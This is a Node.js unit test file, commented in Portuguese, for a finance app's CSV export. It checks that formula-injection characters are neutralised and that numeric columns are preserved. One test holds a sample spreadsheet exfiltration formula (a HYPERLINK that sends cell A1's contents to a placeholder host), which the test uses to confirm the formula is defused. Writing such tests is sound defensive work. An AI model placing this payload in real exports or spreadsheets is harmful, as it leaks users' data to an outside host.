/**
 * Testes do escape de célula do CSV (js/utils.js): neutralização de fórmula e
 * preservação da coluna numérica.
 * Roda com: node --test test/*.test.mjs
 *
 * É a parte que erra em silêncio — uma célula que vira fórmula não lança
 * exceção no app; o estrago acontece na planilha de quem exportou o mês.
 *
 * Valores fictícios; nenhum dado financeiro real.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { csvCelula, csvNumero } from '../js/utils.js';

// ─── os seis gatilhos de fórmula ────────────────────────────────────────

test('prefixa apóstrofo em cada um dos seis caracteres de fórmula', () => {
  for (const [c, nome] of [['=', 'igual'], ['+', 'mais'], ['-', 'menos'],
                           ['@', 'arroba'], ['\t', 'TAB'], ['\r', 'CR']]) {
    const s = c + 'SUPERMERCADO';
    assert.equal(csvCelula(s), `"'${s}"`, `${nome} deveria ser desarmado`);
  }
});

test('a fórmula de exfiltração vira texto', () => {
  const ataque = '=HYPERLINK("https://exemplo.invalido/?d="&A1;"Erro")';
  const saida = csvCelula(ataque);
  assert.ok(saida.startsWith(`"'=`), 'tem de começar com apóstrofo');
  // As aspas internas continuam duplicadas: o apóstrofo não substitui o escape.
  assert.ok(saida.includes('""https://exemplo.invalido'));
});

// ─── o que NÃO deve mudar ───────────────────────────────────────────────

test('descrição comum atravessa sem apóstrofo', () => {
  assert.equal(csvCelula('Padaria do Zé'), '"Padaria do Zé"');
  assert.equal(csvCelula('3x Notebook'), '"3x Notebook"');
});

test('aspas continuam duplicadas', () => {
  assert.equal(csvCelula('Mercado "Bom Preço"'), '"Mercado ""Bom Preço"""');
});

test('nulo e indefinido viram célula vazia', () => {
  assert.equal(csvCelula(null), '""');
  assert.equal(csvCelula(undefined), '""');
});

test('o caractere de fórmula NO MEIO não dispara nada', () => {
  assert.equal(csvCelula('PAG*LOJA-123'), '"PAG*LOJA-123"');
});

// ─── a coluna numérica ──────────────────────────────────────────────────

test('valor negativo sai como número, sem apóstrofo', () => {
  // Se a despesa passasse por csvCelula, o `-` viraria apóstrofo e a planilha
  // deixaria de somar a coluna — que é a razão de a coluna existir.
  assert.equal(csvNumero(-1234.56), '"-1234.56"');
  assert.equal(csvNumero(89.9), '"89.9"');
  assert.equal(csvNumero(0), '"0"');
});
